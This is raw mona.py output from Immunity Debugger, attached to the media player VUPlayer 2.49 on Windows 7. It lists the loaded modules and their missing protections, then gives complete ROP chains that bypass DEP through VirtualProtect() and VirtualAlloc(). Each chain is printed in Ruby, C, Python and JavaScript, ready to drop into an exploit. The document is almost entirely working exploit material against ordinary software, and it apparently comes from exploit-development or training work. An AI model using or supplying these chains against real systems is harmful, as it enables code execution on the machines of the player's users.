================================================================================
  Output generated by mona.py v2.0, rev 494 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : VUPlayer (pid 2268)
  Current mona arguments: rop -m BASS.DLL. -m
================================================================================
  2021-01-02 08:17:47
================================================================================
----------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
----------------------------------------------------------------------------------------------------------------------------------
 0x704c0000 | 0x704c9000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LINKINFO.dll] (C:\Windows\system32\LINKINFO.dll)
 0x75350000 | 0x75353000 | 0x00003000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-normaliz-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-normaliz-l1-1-0.dll)
 0x73c40000 | 0x73c80000 | 0x00040000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [UxTheme.dll] (C:\Windows\system32\UxTheme.dll)
 0x6ffe0000 | 0x70011000 | 0x00031000 | True   | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\Windows\system32\msls31.dll)
 0x73890000 | 0x738a3000 | 0x00013000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x6e650000 | 0x6e688000 | 0x00038000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [odbcint.dll] (C:\Windows\system32\odbcint.dll)
 0x70690000 | 0x706c1000 | 0x00031000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [EhStorShell.dll] (C:\Windows\system32\EhStorShell.dll)
 0x735d0000 | 0x735da000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [slc.dll] (C:\Windows\system32\slc.dll)
 0x76a40000 | 0x76a4a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7601.24517 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x766c0000 | 0x768f7000 | 0x00237000 | True   | True    | True  |  True    | True   | 11.00.9600.19463 [iertutil.dll] (C:\Windows\system32\iertutil.dll)
 0x76e20000 | 0x76f7f000 | 0x0015f000 | True   | True    | True  |  True    | True   | 6.1.7601.24511 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x6f5b0000 | 0x6f5c4000 | 0x00014000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\Windows\system32\MSACM32.dll)
 0x70540000 | 0x7054b000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7601.24197 [CSCAPI.dll] (C:\Windows\system32\CSCAPI.dll)
 0x718e0000 | 0x718e4000 | 0x00004000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-shell32-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-shell32-l1-1-0.dll)
 0x729b0000 | 0x72a00000 | 0x00050000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [webio.dll] (C:\Windows\system32\webio.dll)
 0x73340000 | 0x73471000 | 0x00131000 | True   | True    | True  |  True    | True   | 6.2.9200.22551 [WindowsCodecs.dll] (C:\Windows\system32\WindowsCodecs.dll)
 0x756f0000 | 0x7633c000 | 0x00c4c000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x70620000 | 0x70629000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7601.24197 [CSCDLL.dll] (C:\Windows\System32\CSCDLL.dll)
 0x75660000 | 0x756e3000 | 0x00083000 | True   | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x763a0000 | 0x76469000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.DLL] (C:\Windows\system32\user32.DLL)
 0x73da0000 | 0x73dd9000 | 0x00039000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MMDevApi.dll] (C:\Windows\System32\MMDevApi.dll)
 0x00400000 | 0x00592000 | 0x00192000 | False  | False   | False |  False   | False  | 2.49 [VUPlayer.exe] (C:\Program Files\VUPlayer\VUPlayer.exe)
 0x746d0000 | 0x746d9000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [version.DLL] (C:\Windows\system32\version.DLL)
 0x6fee0000 | 0x6ff12000 | 0x00032000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x75320000 | 0x75347000 | 0x00027000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\Windows\system32\CFGMGR32.dll)
 0x74ff0000 | 0x7500b000 | 0x0001b000 | True   | True    | True  |  True    | True   | 6.1.7601.24520 [SSPICLI.DLL] (C:\Windows\system32\SSPICLI.DLL)
 0x73de0000 | 0x73e05000 | 0x00025000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [POWRPROF.dll] (C:\Windows\system32\POWRPROF.dll)
 0x76bf0000 | 0x76bf3000 | 0x00003000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [normaliz.DLL] (C:\Windows\system32\normaliz.DLL)
 0x6e390000 | 0x6e3de000 | 0x0004e000 | True   | True    | True  |  True    | False  | 11.00.9600.19463 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll)
 0x73e10000 | 0x73f05000 | 0x000f5000 | True   | True    | True  |  True    | True   | 7.00.7600.16385 [propsys.dll] (C:\Windows\system32\propsys.dll)
 0x75080000 | 0x750cc000 | 0x0004c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x76480000 | 0x76555000 | 0x000d5000 | True   | True    | True  |  True    | True   | 6.1.7601.18015 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x75010000 | 0x7501c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7601.24520 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x773c0000 | 0x77502000 | 0x00142000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x76560000 | 0x76579000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x75450000 | 0x75455000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-advapi32-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-advapi32-l1-1-0.dll)
 0x76f80000 | 0x773b7000 | 0x00437000 | True   | True    | True  |  True    | True   | 11.00.9600.19463 [WININET.dll] (C:\Windows\system32\WININET.dll)
 0x76e10000 | 0x76e15000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\system32\PSAPI.DLL)
 0x75470000 | 0x754eb000 | 0x0007b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x75140000 | 0x7514b000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x6ff40000 | 0x6ff56000 | 0x00016000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [thumbcache.dll] (C:\Windows\system32\thumbcache.dll)
 0x75360000 | 0x75379000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [USERENV.dll] (C:\Windows\system32\USERENV.dll)
 0x76a50000 | 0x76bed000 | 0x0019d000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SETUPAPI.dll] (C:\Windows\system32\SETUPAPI.dll)
 0x76d40000 | 0x76e0e000 | 0x000ce000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x750d0000 | 0x750de000 | 0x0000e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x77510000 | 0x7755e000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.24513 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x72a50000 | 0x72aa8000 | 0x00058000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINHTTP.dll] (C:\Windows\system32\WINHTTP.dll)
 0x75460000 | 0x75464000 | 0x00004000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-version-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-version-l1-1-0.dll)
 0x77560000 | 0x7760c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7601.17744 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x6e690000 | 0x6e7ac000 | 0x0011c000 | True   | True    | True  |  True    | True   | 6.06.8063.0 [MFC42.DLL] (C:\Windows\system32\MFC42.DLL)
 0x6ff80000 | 0x6ffd8000 | 0x00058000 | True   | True    | True  |  True    | False  | 6.1.7600.16385 [tiptsf.dll] (C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll)
 0x73fd0000 | 0x7416e000 | 0x0019e000 | True   | True    | True  |  True    | True   | 5.82 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.24483_none_2b200f664577e14b\COMCTL32.dll)
 0x74b00000 | 0x74b17000 | 0x00017000 | True   | True    | True  |  True    | True   | 6.1.7601.24499 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x6e330000 | 0x6e38c000 | 0x0005c000 | True   | True    | True  |  True    | True   | 7.00.7601.24513 [StructuredQuery.dll] (C:\Windows\System32\StructuredQuery.dll)
 0x6f180000 | 0x6f20c000 | 0x0008c000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [ODBC32.dll] (C:\Windows\system32\ODBC32.dll)
 0x70570000 | 0x705da000 | 0x0006a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [cscui.dll] (C:\Windows\System32\cscui.dll)
 0x738b0000 | 0x738b9000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [netutils.dll] (C:\Windows\system32\netutils.dll)
 0x704d0000 | 0x7051e000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [actxprxy.dll] (C:\Windows\system32\actxprxy.dll)
 0x6e5d0000 | 0x6e642000 | 0x00072000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [dsound.dll] (C:\Windows\system32\dsound.dll)
 0x10600000 | 0x1060f000 | 0x0000f000 | False  | False   | False |  False   | False  | 2.3 [BASSMIDI.dll] (C:\Program Files\VUPlayer\BASSMIDI.dll)
 0x739b0000 | 0x739df000 | 0x0002f000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DUser.dll] (C:\Windows\system32\DUser.dll)
 0x10100000 | 0x1010a000 | 0x0000a000 | False  | False   | False |  False   | False  | 2.3 [BASSWMA.dll] (C:\Program Files\VUPlayer\BASSWMA.dll)
 0x76c40000 | 0x76c85000 | 0x00045000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WLDAP32.dll] (C:\Windows\system32\WLDAP32.dll)
 0x75380000 | 0x753cb000 | 0x0004b000 | True   | True    | True  |  True    | True   | 6.1.7601.18015 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x75420000 | 0x75424000 | 0x00004000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-user32-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-user32-l1-1-0.dll)
 0x6ee20000 | 0x6ee24000 | 0x00004000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-shlwapi-l2-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-shlwapi-l2-1-0.dll)
 0x769e0000 | 0x76a37000 | 0x00057000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [shlwapi.DLL] (C:\Windows\system32\shlwapi.DLL)
 0x6d170000 | 0x6de9c000 | 0x00d2c000 | True   | True    | True  |  True    | True   | 11.00.9600.19463 [ieframe.DLL] (C:\Windows\system32\ieframe.DLL)
 0x74e40000 | 0x74e59000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [srvcli.dll] (C:\Windows\system32\srvcli.dll)
 0x73860000 | 0x7388f000 | 0x0002f000 | True   | True    | True  |  True    | True   | 1.3.1001.0 [xmllite.dll] (C:\Windows\system32\xmllite.dll)
 0x739e0000 | 0x73a92000 | 0x000b2000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DUI70.dll] (C:\Windows\system32\DUI70.dll)
 0x6c900000 | 0x6c9a0000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SearchFolder.dll] (C:\Windows\system32\SearchFolder.dll)
 0x6f5e0000 | 0x6f616000 | 0x00036000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [AUDIOSES.DLL] (C:\Windows\system32\AUDIOSES.DLL)
 0x76c90000 | 0x76d31000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7601.24520 [advapi32.DLL] (C:\Windows\system32\advapi32.DLL)
 0x6f920000 | 0x6fab8000 | 0x00198000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NetworkExplorer.dll] (C:\Windows\system32\NetworkExplorer.dll)
 0x74670000 | 0x74691000 | 0x00021000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x701c0000 | 0x701ef000 | 0x0002f000 | True   | True    | True  |  True    | True   | 6.1.7601.23896 [SHDOCVW.dll] (C:\Windows\system32\SHDOCVW.dll)
 0x76580000 | 0x7661d000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.24494 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x708e0000 | 0x70a50000 | 0x00170000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [explorerframe.dll] (C:\Windows\system32\explorerframe.dll)
 0x74fd0000 | 0x74fd8000 | 0x00008000 | True   | True    | True  |  True    | True   | 6.1.7601.24520 [Secur32.dll] (C:\Windows\System32\Secur32.dll)
 0x75430000 | 0x75442000 | 0x00012000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\Windows\system32\DEVOBJ.dll)
 0x74890000 | 0x748cb000 | 0x0003b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x76620000 | 0x766b2000 | 0x00092000 | True   | True    | True  |  True    | True   | 6.1.7601.24515 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x76930000 | 0x769d2000 | 0x000a2000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x754f0000 | 0x7550f000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x10000000 | 0x10041000 | 0x00041000 | False  | False   | False |  False   | False  | 2.3 [BASS.dll] (C:\Program Files\VUPlayer\BASS.dll)
 0x753d0000 | 0x753d4000 | 0x00004000 | True   | True    | True  |  True    | True   | 6.2.9200.16492 [api-ms-win-downlevel-shlwapi-l1-1-0.dll] (C:\Windows\system32\api-ms-win-downlevel-shlwapi-l1-1-0.dll)
 0x702a0000 | 0x70310000 | 0x00070000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntshrui.dll] (C:\Windows\system32\ntshrui.dll)
----------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = tr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x004ef365,  # POP ECX # RETN [VUPlayer.exe] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x004d7fe0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x004413e5,  # POP EBP # RETN [VUPlayer.exe] 
      0x00459e91,  # & call esp [VUPlayer.exe]
      0x10002eb5,  # POP EBX # RETN [BASS.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000040,  # 0x00000040-> edx
      0x101049d8,  # POP ECX # RETN [BASSWMA.dll] 
      0x101086ed,  # &Writable location [BASSWMA.dll]
      0x004ba223,  # POP EDI # RETN [VUPlayer.exe] 
      0x1003a084,  # RETN (ROP NOP) [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x004ef365,  // POP ECX // RETN [VUPlayer.exe] 
      0x1060e25c,  // ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x004d7fe0,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [VUPlayer.exe] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      0x004413e5,  // POP EBP // RETN [VUPlayer.exe] 
      0x00459e91,  // & call esp [VUPlayer.exe]
      0x10002eb5,  // POP EBX // RETN [BASS.dll] 
      0x00000201,  // 0x00000201-> ebx
      0x1004041c,  // POP EDX // RETN [BASS.dll] 
      0x00000040,  // 0x00000040-> edx
      0x101049d8,  // POP ECX // RETN [BASSWMA.dll] 
      0x101086ed,  // &Writable location [BASSWMA.dll]
      0x004ba223,  // POP EDI // RETN [VUPlayer.exe] 
      0x1003a084,  // RETN (ROP NOP) [BASS.dll]
      0x10015f77,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x004ef365,  # POP ECX # RETN [VUPlayer.exe] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x004d7fe0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x004413e5,  # POP EBP # RETN [VUPlayer.exe] 
      0x00459e91,  # & call esp [VUPlayer.exe]
      0x10002eb5,  # POP EBX # RETN [BASS.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00000040,  # 0x00000040-> edx
      0x101049d8,  # POP ECX # RETN [BASSWMA.dll] 
      0x101086ed,  # &Writable location [BASSWMA.dll]
      0x004ba223,  # POP EDI # RETN [VUPlayer.exe] 
      0x1003a084,  # RETN (ROP NOP) [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%uf365%u004e" + // 0x004ef365 : ,# POP ECX # RETN [VUPlayer.exe] 
    "%ue25c%u1060" + // 0x1060e25c : ,# ptr to &VirtualProtect() [IAT BASSMIDI.dll]
    "%u7fe0%u004d" + // 0x004d7fe0 : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "%u13e5%u0044" + // 0x004413e5 : ,# POP EBP # RETN [VUPlayer.exe] 
    "%u9e91%u0045" + // 0x00459e91 : ,# & call esp [VUPlayer.exe]
    "%u2eb5%u1000" + // 0x10002eb5 : ,# POP EBX # RETN [BASS.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u041c%u1004" + // 0x1004041c : ,# POP EDX # RETN [BASS.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%u49d8%u1010" + // 0x101049d8 : ,# POP ECX # RETN [BASSWMA.dll] 
    "%u86ed%u1010" + // 0x101086ed : ,# &Writable location [BASSWMA.dll]
    "%ua223%u004b" + // 0x004ba223 : ,# POP EDI # RETN [VUPlayer.exe] 
    "%ua084%u1003" + // 0x1003a084 : ,# RETN (ROP NOP) [BASS.dll]
    "%u5f77%u1001" + // 0x10015f77 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x00000000,  # [-] Unable to find API pointer -> ecx
      0x004d7fe0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x0042cb02,  # POP EBP # RETN [VUPlayer.exe] 
      0x00459e91,  # & call esp [VUPlayer.exe]
      0x10001d86,  # POP EBX # RETN [BASS.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00001000,  # 0x00001000-> edx
      0x004cdbd6,  # POP ECX # RETN [VUPlayer.exe] 
      0x00000040,  # 0x00000040-> ecx
      0x004ca628,  # POP EDI # RETN [VUPlayer.exe] 
      0x1003a084,  # RETN (ROP NOP) [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x004c4f94,  # PUSHAD # RETN [VUPlayer.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x00000000,  // [-] Unable to find API pointer -> ecx
      0x004d7fe0,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [VUPlayer.exe] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      0x0042cb02,  // POP EBP // RETN [VUPlayer.exe] 
      0x00459e91,  // & call esp [VUPlayer.exe]
      0x10001d86,  // POP EBX // RETN [BASS.dll] 
      0x00000001,  // 0x00000001-> ebx
      0x1004041c,  // POP EDX // RETN [BASS.dll] 
      0x00001000,  // 0x00001000-> edx
      0x004cdbd6,  // POP ECX // RETN [VUPlayer.exe] 
      0x00000040,  // 0x00000040-> ecx
      0x004ca628,  // POP EDI // RETN [VUPlayer.exe] 
      0x1003a084,  // RETN (ROP NOP) [BASS.dll]
      0x10015f77,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      0x004c4f94,  // PUSHAD // RETN [VUPlayer.exe] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find API pointer -> ecx
      0x004d7fe0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x0042cb02,  # POP EBP # RETN [VUPlayer.exe] 
      0x00459e91,  # & call esp [VUPlayer.exe]
      0x10001d86,  # POP EBX # RETN [BASS.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00001000,  # 0x00001000-> edx
      0x004cdbd6,  # POP ECX # RETN [VUPlayer.exe] 
      0x00000040,  # 0x00000040-> ecx
      0x004ca628,  # POP EDI # RETN [VUPlayer.exe] 
      0x1003a084,  # RETN (ROP NOP) [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x004c4f94,  # PUSHAD # RETN [VUPlayer.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> ecx
    "%u7fe0%u004d" + // 0x004d7fe0 : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [VUPlayer.exe] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "%ucb02%u0042" + // 0x0042cb02 : ,# POP EBP # RETN [VUPlayer.exe] 
    "%u9e91%u0045" + // 0x00459e91 : ,# & call esp [VUPlayer.exe]
    "%u1d86%u1000" + // 0x10001d86 : ,# POP EBX # RETN [BASS.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%u041c%u1004" + // 0x1004041c : ,# POP EDX # RETN [BASS.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%udbd6%u004c" + // 0x004cdbd6 : ,# POP ECX # RETN [VUPlayer.exe] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%ua628%u004c" + // 0x004ca628 : ,# POP EDI # RETN [VUPlayer.exe] 
    "%ua084%u1003" + // 0x1003a084 : ,# RETN (ROP NOP) [BASS.dll]
    "%u5f77%u1001" + // 0x10015f77 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%u4f94%u004c" + // 0x004c4f94 : ,# PUSHAD # RETN [VUPlayer.exe] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

